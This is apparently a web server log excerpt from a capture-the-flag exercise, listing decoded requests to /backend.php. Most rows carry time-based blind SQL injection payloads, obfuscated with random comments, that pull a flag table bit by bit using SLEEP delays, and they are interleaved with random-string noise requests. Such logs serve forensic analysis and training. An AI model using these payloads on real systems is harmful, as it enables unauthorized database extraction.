line_no	timestamp	decoded_request
692	01/Mar/2015:13:19:25 -0500	/backend.php?user=admin' AND IF(/*cZDY7c*/SUBSTRING(REVERSE(/*VMSWcKZF2*/CONV(HEX(SUBSTRING(/*oAS*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*2VaFd*/),36,1)),16,2))/*3EymFR8bu8*/,7,1)=1,SLEEP(2),9214369) AND '58924
693	01/Mar/2015:13:19:28 -0500	/backend.php?user=4DJNy61QTUZfjnEkhjVzUXhkgqhMDqOZfRfg8NWrW8LMwsXzDYlBADhS4gu1GTR
694	01/Mar/2015:13:19:27 -0500	/backend.php?user=admin' AND IF(/*8Vsjim*/SUBSTRING(REVERSE(/*2W*/CONV(HEX(SUBSTRING(/*JBgPkDGOLcm*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*BBLm3*/),37,1)),16,2))/*6uwh*/,1,1)=1,SLEEP(2),482392721) AND '6591628
695	01/Mar/2015:13:19:29 -0500	/backend.php?user=bwcEFoWh4SA30AvrRuk4hnEeUw6N2TlHwUt9IWzdB6gC9foqvfr6n7Vxqk0gZdYMu2m
696	01/Mar/2015:13:19:30 -0500	/backend.php?user=YA9rlOZNTlmG7ZzlxLvFeF8QyqyuXICMSxo5scvF7VgtCLLlFYM6SjUCat5MXXJlHiF2HTuL4I1Nhpo9RKkdRvtALfptqwJklI
697	01/Mar/2015:13:19:29 -0500	/backend.php?user=admin' AND IF(/*8i*/SUBSTRING(REVERSE(/*plSGf4rG*/CONV(HEX(SUBSTRING(/*t6buOBg*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*bAy6*/),37,1)),16,2))/*Zsr9nwbV*/,2,1)=1,SLEEP(2),124898) AND '8179577
698	01/Mar/2015:13:19:32 -0500	/backend.php?user=s4rq7acAPaOdJdn3OkypqaTSONZnYXmKmo8XiMu7WTEJvVilDiYyRxYuEz5Y
699	01/Mar/2015:13:19:31 -0500	/backend.php?user=admin' AND IF(/*Ykr4kJ9HGQX*/SUBSTRING(REVERSE(/*ecHteh8DWK*/CONV(HEX(SUBSTRING(/*qzsi*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*tME*/),37,1)),16,2))/*eQnI0W0i*/,3,1)=1,SLEEP(2),15726) AND '632
700	01/Mar/2015:13:19:33 -0500	/backend.php?user=admin' AND IF(/*4k2*/SUBSTRING(REVERSE(/*WnktJf*/CONV(HEX(SUBSTRING(/*kL2MccxyT0*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*KPtKq*/),37,1)),16,2))/*0qF2u3*/,4,1)=1,SLEEP(2),72493525) AND '43492
701	01/Mar/2015:13:19:33 -0500	/backend.php?user=admin' AND IF(/*c1SzRls*/SUBSTRING(REVERSE(/*jcCQx*/CONV(HEX(SUBSTRING(/*f30vYfURy*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*fW*/),37,1)),16,2))/*2jnefqvt0I*/,5,1)=1,SLEEP(2),1221136) AND '4111459
702	01/Mar/2015:13:19:34 -0500	/backend.php?user=rWErWhzy5LTwJgWYOuHjHLcB4jjM35ZVcKInz9voqf5frG6uqQholSk9mPqE6EWCVC1mV4A
703	01/Mar/2015:13:19:33 -0500	/backend.php?user=admin' AND IF(/*B488t3xs0lj*/SUBSTRING(REVERSE(/*4j5*/CONV(HEX(SUBSTRING(/*tknem*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*3y3xJ*/),37,1)),16,2))/*o4WZTtXj*/,6,1)=1,SLEEP(2),4654) AND '226
704	01/Mar/2015:13:19:36 -0500	/backend.php?user=3s3kyROyjfhSz4UysGtMQagVUSxohi8IczqQjkEh1Nv8cd3tSJutYL
705	01/Mar/2015:13:19:35 -0500	/backend.php?user=admin' AND IF(/*WQ*/SUBSTRING(REVERSE(/*kag7uLd*/CONV(HEX(SUBSTRING(/*OStivLLiy5*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*MLiJ1ZyNt*/),37,1)),16,2))/*rj9*/,7,1)=1,SLEEP(2),989752261) AND '1622
706	01/Mar/2015:13:19:37 -0500	/backend.php?user=admin' AND IF(/*ERuD*/SUBSTRING(REVERSE(/*aPx*/CONV(HEX(SUBSTRING(/*1b*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*JXsDGLv*/),38,1)),16,2))/*u9r49bHWsMr*/,1,1)=1,SLEEP(2),95175) AND '467935
707	01/Mar/2015:13:19:37 -0500	/backend.php?user=admin' AND IF(/*KNt4YFgmJR*/SUBSTRING(REVERSE(/*4SPZ*/CONV(HEX(SUBSTRING(/*ojzoK*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*p7Ap8epHG7*/),38,1)),16,2))/*T8QHhga3E*/,2,1)=1,SLEEP(2),9949) AND '2177
708	01/Mar/2015:13:19:37 -0500	/backend.php?user=admin' AND IF(/*tbJZXlZu*/SUBSTRING(REVERSE(/*YJ9JKWBr*/CONV(HEX(SUBSTRING(/*CV6foK2*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ivGCca2oMv*/),38,1)),16,2))/*zF7*/,3,1)=1,SLEEP(2),76466425) AND '522
709	01/Mar/2015:13:19:37 -0500	/backend.php?user=admin' AND IF(/*TvIuPi9a*/SUBSTRING(REVERSE(/*R0o*/CONV(HEX(SUBSTRING(/*ZsV*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*hTwpmuOmA*/),38,1)),16,2))/*ykenP3*/,4,1)=1,SLEEP(2),59538) AND '364
710	01/Mar/2015:13:19:37 -0500	/backend.php?user=admin' AND IF(/*k7TlLR*/SUBSTRING(REVERSE(/*AeKrO*/CONV(HEX(SUBSTRING(/*8xbWOPesfgm*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*2sTea2h4A*/),38,1)),16,2))/*oyVZUOAE*/,5,1)=1,SLEEP(2),7857337) AND '537
711	01/Mar/2015:13:19:37 -0500	/backend.php?user=admin' AND IF(/*NwHCPPJ0*/SUBSTRING(REVERSE(/*Etz*/CONV(HEX(SUBSTRING(/*XmrukY*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Nm3bEZbT7*/),38,1)),16,2))/*Bi8nM*/,6,1)=1,SLEEP(2),655655) AND '1475621
712	01/Mar/2015:13:19:37 -0500	/backend.php?user=admin' AND IF(/*G779*/SUBSTRING(REVERSE(/*84*/CONV(HEX(SUBSTRING(/*ZHZPpR*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*RbhsTxT8Z*/),38,1)),16,2))/*fBmS*/,7,1)=1,SLEEP(2),279676732) AND '29
713	01/Mar/2015:13:19:38 -0500	/backend.php?user=XrZWMyOjGIuhxad75eYp4VbYav6dPBOGPky9JY9WVPbkBA1iqUIKeC0VRoRBYO
714	01/Mar/2015:13:19:39 -0500	/backend.php?user=bG9zetehlLrhvyuYuzhg6zVePDsVqJfwUaH1aDYI10fYvPSgWw4IH6
715	01/Mar/2015:13:19:40 -0500	/backend.php?user=b79g4nkNIultcIx2bGccTgNqFKuXbHCfj9iHwwNIk3JEea4kLS4yPKSciYuxRIea
716	01/Mar/2015:13:19:42 -0500	/backend.php?user=x6NBrs2wtwbzOtKZlR1rA5iArkXuyeHZjKdvKZyIOw
717	01/Mar/2015:13:19:44 -0500	/backend.php?user=LnsYkR8oqAFi8MuExSi4fqmoTblSqeShzQ0OtGnEFlYyh7
718	01/Mar/2015:13:19:45 -0500	/backend.php?user=cWLI6aEvzbBAs8cdmQHQGtcGbLylnSG5Ru2ZYatbxHc3v2rjzW84CAjP8c66oWOKiIwOifYGgITwahij5arZJbAAWy00
719	01/Mar/2015:13:19:47 -0500	/backend.php?user=PnPYmLTfD5hN2gK8xCL
720	01/Mar/2015:13:19:48 -0500	/backend.php?user=itXUnBeMymPlhkETxarg9eotYAJ8zAngi6kK4MkafUCms
